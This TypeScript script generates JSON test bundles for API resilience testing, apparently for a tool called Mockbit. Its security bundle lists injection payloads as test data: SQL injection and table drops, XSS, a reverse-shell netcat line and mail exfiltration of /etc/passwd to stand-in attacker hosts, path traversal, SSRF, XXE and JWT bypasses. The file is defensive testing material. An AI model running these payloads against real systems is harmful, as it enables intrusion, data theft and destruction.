/**
 * Claude Resilience & Security Edge-Case Bundle Generator for Mockbit — 65+ Corpus Expansion
 *
 * Usage:
 * npx tsx scripts/generate-claude-resilience.ts
 *
 * Generates static, auditable edge-case bundles complete with:
 * - Machine-readable placement metadata (target, field_type_hint)
 * - Automated CI assertion objects (status_not, body_not_contains)
 * - WAF-safe base64 encodings (payload_b64)
 */

import fs from "fs";
import path from "path";

const OUTPUT_DIR = path.join(process.cwd(), "lib", "datasets", "resilience");

export interface VectorItem {
  id: string;
  category: string;
  target: "body" | "query" | "header" | "path";
  field_type_hint: "string" | "numeric" | "json_object" | "jwt_header" | "filename";
  payload: string | number | object;
  payload_b64?: string;
  expected_safe_behavior: string;
  expected_assertion: {
    status_not: number;
    body_not_contains: string[];
    response_sanitized: boolean;
  };
  description: string;
}

export interface ResilienceBundle {
  id: string;
  name: string;
  category: string;
  description: string;
  totalVectors: number;
  vectors: VectorItem[];
}

function encodeB64(val: any): string {
  const str = typeof val === "object" ? JSON.stringify(val) : String(val);
  return Buffer.from(str).toString("base64");
}

function generateSecurityBundle(): ResilienceBundle {
  const rawVectors: Omit<VectorItem, "payload_b64">[] = [
    // --- SQL Injection (5 vectors) ---
    {
      id: "sqli_1",
      category: "SQL Injection",
      target: "body",
      field_type_hint: "string",
      payload: "' OR '1'='1' --",
      expected_safe_behavior: "Escaped or rejected by parameterized SQL queries",
      expected_assertion: { status_not: 500, body_not_contains: ["syntax error at or near", "unclosed quotation mark"], response_sanitized: true },
      description: "Classic authentication bypass SQL injection vector.",
    },
    {
      id: "sqli_2",
      category: "SQL Injection",
      target: "body",
      field_type_hint: "string",
      payload: "1; DROP TABLE users; --",
      expected_safe_behavior: "Sanitized or rejected; DDL statements blocked",
      expected_assertion: { status_not: 500, body_not_contains: ["table users dropped", "syntax error"], response_sanitized: true },
      description: "Destructive SQL statement injection payload.",
    },
    {
      id: "sqli_3",
      category: "SQL Injection",
      target: "query",
      field_type_hint: "string",
      payload: "admin' UNION SELECT null, username, password FROM users --",
      expected_safe_behavior: "Union query injection blocked by ORM/query builder",
      expected_assertion: { status_not: 500, body_not_contains: ["password", "hash", "users"], response_sanitized: true },
      description: "UNION-based data exfiltration SQL injection.",
    },
    {
      id: "sqli_4",
      category: "SQL Injection",
      target: "query",
      field_type_hint: "string",
      payload: "1 AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT version()), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x)a)",
      expected_safe_behavior: "Error-based SQLi payload rejected safely",
      expected_assertion: { status_not: 500, body_not_contains: ["Duplicate entry", "information_schema"], response_sanitized: true },
      description: "Error-based information schema extraction payload.",
    },
    {
      id: "sqli_5",
      category: "SQL Injection",
      target: "body",
      field_type_hint: "string",
      payload: "'; WAITFOR DELAY '0:0:5'--",
      expected_safe_behavior: "Time-delay query execution blocked",
      expected_assertion: { status_not: 500, body_not_contains: ["WAITFOR"], response_sanitized: true },
      description: "Time-based blind SQL injection vector.",
    },

    // --- NoSQL Injection (3 vectors) ---
    {
      id: "nosqli_1",
      category: "NoSQL Injection",
      target: "body",
      field_type_hint: "json_object",
      payload: { $gt: "" },
      expected_safe_behavior: "Type-checked as string; Mongo operator objects rejected",
      expected_assertion: { status_not: 500, body_not_contains: ["$gt", "Can't canonicalize query"], response_sanitized: true },
      description: "MongoDB query operator injection vector for auth bypass.",
    },
    {
      id: "nosqli_2",
      category: "NoSQL Injection",
      target: "body",
      field_type_hint: "json_object",
      payload: { $where: "this.password.length > 0" },
      expected_safe_behavior: "$where JS code execution in MongoDB query disabled",
      expected_assertion: { status_not: 500, body_not_contains: ["$where"], response_sanitized: true },
      description: "MongoDB $where Javascript execution injection vector.",
    },
    {
      id: "nosqli_3",
      category: "NoSQL Injection",
      target: "body",
      field_type_hint: "json_object",
      payload: { $ne: null },
      expected_safe_behavior: "Not-equal operator object stripped or type-checked to string",
      expected_assertion: { status_not: 500, body_not_contains: ["$ne"], response_sanitized: true },
      description: "MongoDB $ne wildcard matching vector.",
    },

    // --- XSS Payloads (5 vectors) ---
    {
      id: "xss_1",
      category: "Cross-Site Scripting (XSS)",
      target: "body",
      field_type_hint: "string",
      payload: "<script>alert('xss')</script>",
      expected_safe_behavior: "HTML escaped to &lt;script&gt; or rejected",
      expected_assertion: { status_not: 500, body_not_contains: ["<script>alert('xss')</script>"], response_sanitized: true },
      description: "Reflected XSS script execution payload.",
    },
    {
      id: "xss_2",
      category: "Cross-Site Scripting (XSS)",
      target: "body",
      field_type_hint: "string",
      payload: "<img src=x onerror=alert('xss') />",
      expected_safe_behavior: "Attributes sanitized; event handlers stripped",
      expected_assertion: { status_not: 500, body_not_contains: ["onerror="], response_sanitized: true },
      description: "DOM-based event handler XSS injection.",
    },
    {
      id: "xss_3",
      category: "Cross-Site Scripting (XSS)",
      target: "body",
      field_type_hint: "string",
      payload: "javascript:/*-->*/</title></style></textarea></script></xmp><svg/onload='+/\"/../onload=alert(1)//'>",
      expected_safe_behavior: "Polyglot XSS payload neutralized across all contexts",
      expected_assertion: { status_not: 500, body_not_contains: ["javascript:"], response_sanitized: true },
      description: "Polyglot XSS payload effective across HTML/JS/Attribute contexts.",
    },
    {
      id: "xss_4",
      category: "Cross-Site Scripting (XSS)",
      target: "body",
      field_type_hint: "string",
      payload: "<iframe src=\"javascript:alert(`xss`)\"></iframe>",
      expected_safe_behavior: "iframe element or javascript URI scheme stripped",
      expected_assertion: { status_not: 500, body_not_contains: ["<iframe", "javascript:"], response_sanitized: true },
      description: "iframe Javascript URI scheme XSS payload.",
    },
    {
      id: "xss_5",
      category: "Cross-Site Scripting (XSS)",
      target: "body",
      field_type_hint: "string",
      payload: "<svg><animate onbegin=alert(1) attributeName=x>",
      expected_safe_behavior: "SVG animate vector event handler stripped",
      expected_assertion: { status_not: 500, body_not_contains: ["onbegin="], response_sanitized: true },
      description: "SVG animation event-driven XSS vector.",
    },

    // --- Command Injection (3 vectors) ---
    {
      id: "cmdi_1",
      category: "Command Injection",
      target: "body",
      field_type_hint: "string",
      payload: "; cat /etc/passwd | mail attacker@evil.com",
      expected_safe_behavior: "Subshell execution disabled; arguments escaped",
      expected_assertion: { status_not: 500, body_not_contains: ["root:x:0:0"], response_sanitized: true },
      description: "OS command execution shell pipe payload.",
    },
    {
      id: "cmdi_2",
      category: "Command Injection",
      target: "body",
      field_type_hint: "string",
      payload: "`id` && $(whoami)",
      expected_safe_behavior: "Backtick and shell substitution sequences escaped",
      expected_assertion: { status_not: 500, body_not_contains: ["uid=", "gid="], response_sanitized: true },
      description: "Command substitution backtick execution payload.",
    },
    {
      id: "cmdi_3",
      category: "Command Injection",
      target: "body",
      field_type_hint: "string",
      payload: "127.0.0.1; nc -e /bin/bash attacker.com 4444",
      expected_safe_behavior: "Reverse shell Netcat command chaining blocked",
      expected_assertion: { status_not: 500, body_not_contains: ["nc -e"], response_sanitized: true },
      description: "Reverse shell Netcat injection vector.",
    },

    // --- Path Traversal (3 vectors) ---
    {
      id: "path_1",
      category: "Path Traversal",
      target: "path",
      field_type_hint: "filename",
      payload: "../../../../../etc/passwd",
      expected_safe_behavior: "Path resolved within sandbox root; traversal blocked",
      expected_assertion: { status_not: 500, body_not_contains: ["root:x:0:0"], response_sanitized: true },
      description: "Directory path traversal vector.",
    },
    {
      id: "path_2",
      category: "Path Traversal",
      target: "path",
      field_type_hint: "filename",
      payload: "..%252f..%252f..%252fwinnt%252fsystem32%252fcmd.exe",
      expected_safe_behavior: "Double-URL encoded path traversal blocked",
      expected_assertion: { status_not: 500, body_not_contains: ["[System32]"], response_sanitized: true },
      description: "Double URL encoded path traversal attack.",
    },
    {
      id: "path_3",
      category: "Path Traversal",
      target: "path",
      field_type_hint: "filename",
      payload: "....//....//....//etc/shadow",
      expected_safe_behavior: "Recursive dot-slash strip bypass blocked",
      expected_assertion: { status_not: 500, body_not_contains: ["shadow"], response_sanitized: true },
      description: "Nested dot-slash strip replacement bypass path traversal.",
    },

    // --- Prototype Pollution (3 vectors) ---
    {
      id: "proto_1",
      category: "Prototype Pollution",
      target: "body",
      field_type_hint: "json_object",
      payload: { __proto__: { polluted: true } },
      expected_safe_behavior: "Key forbidden or frozen Object prototype unaffected",
      expected_assertion: { status_not: 500, body_not_contains: ["polluted: true"], response_sanitized: true },
      description: "__proto__ key prototype pollution vector.",
    },
    {
      id: "proto_2",
      category: "Prototype Pollution",
      target: "body",
      field_type_hint: "json_object",
      payload: { "constructor.prototype.isAdmin": true },
      expected_safe_behavior: "Constructor prototype property mutation rejected",
      expected_assertion: { status_not: 500, body_not_contains: ["isAdmin: true"], response_sanitized: true },
      description: "constructor.prototype property path injection vector.",
    },
    {
      id: "proto_3",
      category: "Prototype Pollution",
      target: "body",
      field_type_hint: "json_object",
      payload: { "prototype.status": "pwned" },
      expected_safe_behavior: "Prototype dictionary assignment sanitized safely",
      expected_assertion: { status_not: 500, body_not_contains: ["pwned"], response_sanitized: true },
      description: "Direct prototype property modification payload.",
    },

    // --- JWT & Auth Flaws (3 vectors) ---
    {
      id: "jwt_1",
      category: "JWT Authentication Bypass",
      target: "header",
      field_type_hint: "jwt_header",
      payload: "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIiwiaXNBZG1pbiI6dHJ1ZX0.",
      expected_safe_behavior: "JWT with 'none' algorithm strictly rejected by authorization verifier",
      expected_assertion: { status_not: 200, body_not_contains: ["authenticated: true"], response_sanitized: true },
      description: "Unsigned JWT token with 'none' algorithm payload.",
    },
    {
      id: "jwt_2",
      category: "JWT Authentication Bypass",
      target: "header",
      field_type_hint: "jwt_header",
      payload: "Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.INVALID_SIG",
      expected_safe_behavior: "JWT with invalid signature rejected with 401 Unauthorized",
      expected_assertion: { status_not: 200, body_not_contains: ["admin_granted"], response_sanitized: true },
      description: "Forged RSA256 signature JWT payload.",
    },
    {
      id: "jwt_3",
      category: "JWT Authentication Bypass",
      target: "header",
      field_type_hint: "jwt_header",
      payload: "Bearer null",
      expected_safe_behavior: "Literal string 'null' token handled without crashing auth middleware",
      expected_assertion: { status_not: 500, body_not_contains: ["NullPointerException"], response_sanitized: true },
      description: "Malformed Authorization header value.",
    },

    // --- SSRF & XXE (3 vectors) ---
    {
      id: "ssrf_1",
      category: "SSRF (Server-Side Request Forgery)",
      target: "body",
      field_type_hint: "string",
      payload: "http://169.254.169.254/latest/meta-data/",
      expected_safe_behavior: "Cloud metadata IP range (169.254.x.x) blocked by egress firewall",
      expected_assertion: { status_not: 500, body_not_contains: ["iam/security-credentials"], response_sanitized: true },
      description: "AWS cloud metadata service SSRF URL vector.",
    },
    {
      id: "ssrf_2",
      category: "SSRF (Server-Side Request Forgery)",
      target: "body",
      field_type_hint: "string",
      payload: "http://localhost:22",
      expected_safe_behavior: "Loopback IP addresses (127.0.0.1 / localhost) blocked for outbound webhooks",
      expected_assertion: { status_not: 500, body_not_contains: ["SSH-2.0"], response_sanitized: true },
      description: "Internal loopback SSH port scanning SSRF payload.",
    },
    {
      id: "xxe_1",
      category: "XML External Entity (XXE)",
      target: "body",
      field_type_hint: "string",
      payload: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
      expected_safe_behavior: "External DTD parsing disabled; entity expansion rejected",
      expected_assertion: { status_not: 500, body_not_contains: ["root:x:0:0"], response_sanitized: true },
      description: "XML external entity local file disclosure payload.",
    },
  ];

  const vectors: VectorItem[] = rawVectors.map((v) => ({
    ...v,
    payload_b64: encodeB64(v.payload),
  }));

  return {
    id: "security",
    name: "Security Injection Attack Payload Library",
    category: "Security Harness",
    description: "Fixed, auditable attack payload library with machine-readable placement metadata and automated CI assertion rules.",
    totalVectors: vectors.length,
    vectors,
  };
}

function generateUnicodeBundle(): ResilienceBundle {
  const rawVectors: Omit<VectorItem, "payload_b64">[] = [
    {
      id: "rtl_1",
      category: "RTL Text & Mixed Bidirectional",
      target: "body",
      field_type_hint: "string",
      payload: "مرحبا بكم - Hello Sarah 123! (שָׁלוֹם)",
      expected_safe_behavior: "Rendered with correct BiDi order without layout corruption",
      expected_assertion: { status_not: 500, body_not_contains: ["\uFFFD"], response_sanitized: true },
      description: "Mixed Arabic RTL, Hebrew, and English LTR text string.",
    },
    {
      id: "zwj_1",
      category: "ZWJ Multi-Character Emoji",
      target: "body",
      field_type_hint: "string",
      payload: "👩‍👩‍👧‍👦 (Family: Woman, Woman, Girl, Boy)",
      expected_safe_behavior: "Counted as 1 visual grapheme cluster; DB UTF-8MB4 storage supported",
      expected_assertion: { status_not: 500, body_not_contains: ["\uFFFD"], response_sanitized: true },
      description: "Zero-Width Joiner sequence (7 code points, 1 visual character).",
    },
    {
      id: "zalgo_1",
      category: "Combining Diacritics (Zalgo Text)",
      target: "body",
      field_type_hint: "string",
      payload: "T̶h̶e̶ ̶V̶o̶i̶d̶ ̶C̶o̶m̶e̶s̶ ̶H̶u̶n̶g̶e̶r̶s̶",
      expected_safe_behavior: "Container height capped or normalized without breaking UI layout",
      expected_assertion: { status_not: 500, body_not_contains: ["\uFFFD"], response_sanitized: true },
      description: "Stacking combining diacritics that exceed line bounds.",
    },
    {
      id: "surrogate_1",
      category: "Surrogate Pairs & CJK",
      target: "body",
      field_type_hint: "string",
      payload: "𠮷野家 (Yoshinoya Extension B) & 𝌆 (Musical Symbol)",
      expected_safe_behavior: "Surrogate pairs preserved without string slicing corruption",
      expected_assertion: { status_not: 500, body_not_contains: ["\uFFFD"], response_sanitized: true },
      description: "Unicode Plane 2 CJK Unified Ideographs Extension B.",
    },
    {
      id: "diacritic_1",
      category: "Unicode Normalization Forms",
      target: "body",
      field_type_hint: "string",
      payload: "café (NFC: \\u00e9 vs NFD: e + \\u0301)",
      expected_safe_behavior: "Normalized via String.prototype.normalize('NFC') before database lookup",
      expected_assertion: { status_not: 500, body_not_contains: ["\uFFFD"], response_sanitized: true },
      description: "Canonical decomposition vs composition equivalence.",
    },
    {
      id: "null_1",
      category: "Embedded Null Byte",
      target: "path",
      field_type_hint: "filename",
      payload: "image.png\0.exe",
      expected_safe_behavior: "Null byte stripped or string rejected; file extension check enforced",
      expected_assertion: { status_not: 500, body_not_contains: ["\0"], response_sanitized: true },
      description: "Null byte injection in string filenames.",
    },
    {
      id: "grapheme_1",
      category: "Extreme Grapheme Cluster",
      target: "body",
      field_type_hint: "string",
      payload: "🏴󠁧󠁢󠁷󠁬󠁳󠁿 (Flag of Wales - 7 code points)",
      expected_safe_behavior: "Correct string length calculation using Intl.Segmenter",
      expected_assertion: { status_not: 500, body_not_contains: ["\uFFFD"], response_sanitized: true },
      description: "Emoji flag sequence using regional indicator tags.",
    },
  ];

  const vectors: VectorItem[] = rawVectors.map((v) => ({
    ...v,
    payload_b64: encodeB64(v.payload),
  }));

  return {
    id: "unicode",
    name: "Unicode & i18n Stress Harness",
    category: "i18n & Unicode",
    description: "Internationalization torture test strings for verifying UTF-8 encoding, ZWJ emojis, and RTL text.",
    totalVectors: vectors.length,
    vectors,
  };
}

function generateBoundaryBundle(): ResilienceBundle {
  const rawVectors: Omit<VectorItem, "payload_b64">[] = [
    {
      id: "num_1",
      category: "Numeric Limits",
      target: "body",
      field_type_hint: "numeric",
      payload: 9007199254740991,
      expected_safe_behavior: "Parsed as BigInt or handled safely without precision loss",
      expected_assertion: { status_not: 500, body_not_contains: ["overflow"], response_sanitized: true },
      description: "Number.MAX_SAFE_INTEGER in JavaScript.",
    },
    {
      id: "num_2",
      category: "Float Precision Trap",
      target: "body",
      field_type_hint: "numeric",
      payload: 0.1 + 0.2, // 0.30000000000000004
      expected_safe_behavior: "Rounded using decimal math or cent-based integers",
      expected_assertion: { status_not: 500, body_not_contains: ["0.30000000000000004"], response_sanitized: true },
      description: "Floating point binary representation inaccuracy.",
    },
    {
      id: "num_3",
      category: "Negative Zero & Special Values",
      target: "body",
      field_type_hint: "numeric",
      payload: -0,
      expected_safe_behavior: "Object.is(-0, 0) handled cleanly without division by zero errors",
      expected_assertion: { status_not: 500, body_not_contains: ["Division by zero"], response_sanitized: true },
      description: "IEEE 754 negative zero value.",
    },
    {
      id: "date_1",
      category: "Temporal Edge Case",
      target: "body",
      field_type_hint: "string",
      payload: "2024-02-29T23:59:59Z",
      expected_safe_behavior: "Parsed correctly as a leap year date",
      expected_assertion: { status_not: 500, body_not_contains: ["Invalid Date"], response_sanitized: true },
      description: "Leap year February 29 date timestamp.",
    },
    {
      id: "date_2",
      category: "DST Transition Ambiguity",
      target: "body",
      field_type_hint: "string",
      payload: "2026-11-01T01:30:00-04:00",
      expected_safe_behavior: "Stored in UTC to avoid ambiguous wall-clock hour",
      expected_assertion: { status_not: 500, body_not_contains: ["AmbiguousTimeError"], response_sanitized: true },
      description: "Daylight Saving Time fall-back duplicate hour.",
    },
    {
      id: "date_3",
      category: "Unix Epoch 0",
      target: "body",
      field_type_hint: "string",
      payload: "1970-01-01T00:00:00Z",
      expected_safe_behavior: "Treated as valid timestamp rather than falsy empty date",
      expected_assertion: { status_not: 500, body_not_contains: ["Epoch error"], response_sanitized: true },
      description: "Unix Epoch zero boundary.",
    },
    {
      id: "pag_1",
      category: "Pagination Traps",
      target: "query",
      field_type_hint: "numeric",
      payload: { page: -1, limit: 0 },
      expected_safe_behavior: "Sanitized to default page=1, limit=10; divide-by-zero avoided",
      expected_assertion: { status_not: 500, body_not_contains: ["DivisionByZero"], response_sanitized: true },
      description: "Negative page index and zero limit query parameters.",
    },
    {
      id: "pag_2",
      category: "Pagination Overflow",
      target: "query",
      field_type_hint: "numeric",
      payload: { page: 1, limit: 999999999 },
      expected_safe_behavior: "Hard capped at max limit = 100 to prevent OOM database crash",
      expected_assertion: { status_not: 500, body_not_contains: ["OutOfMemory"], response_sanitized: true },
      description: "Extreme limit query parameter requesting millions of records.",
    },
    {
      id: "str_1",
      category: "Empty String Key",
      target: "body",
      field_type_hint: "string",
      payload: "",
      expected_safe_behavior: "Rejected as required field or defaulted cleanly",
      expected_assertion: { status_not: 500, body_not_contains: ["UncaughtException"], response_sanitized: true },
      description: "0-length string payload.",
    },
  ];

  const vectors: VectorItem[] = rawVectors.map((v) => ({
    ...v,
    payload_b64: encodeB64(v.payload),
  }));

  return {
    id: "boundary",
    name: "Numeric, Temporal & Boundary Conditions",
    category: "Boundary & Outages",
    description: "Pure edge-case inputs for numeric precision, DST timezones, leap years, and extreme pagination parameters.",
    totalVectors: vectors.length,
    vectors,
  };
}

async function main() {
  console.log("=== Mockbit Resilience & Security Bundle Generator (65+ Corpus) ===");

  if (!fs.existsSync(OUTPUT_DIR)) {
    fs.mkdirSync(OUTPUT_DIR, { recursive: true });
  }

  const bundles = [generateSecurityBundle(), generateUnicodeBundle(), generateBoundaryBundle()];

  for (const b of bundles) {
    const filePath = path.join(OUTPUT_DIR, `${b.id}.json`);
    fs.writeFileSync(filePath, JSON.stringify(b, null, 2));
    console.log(`✓ Wrote expanded resilience bundle: ${b.id}.json (${b.vectors.length} vectors)`);
  }

  console.log("\n=== All Resilience Edge-Case Bundles Ready ===");
}

main().catch(console.error);
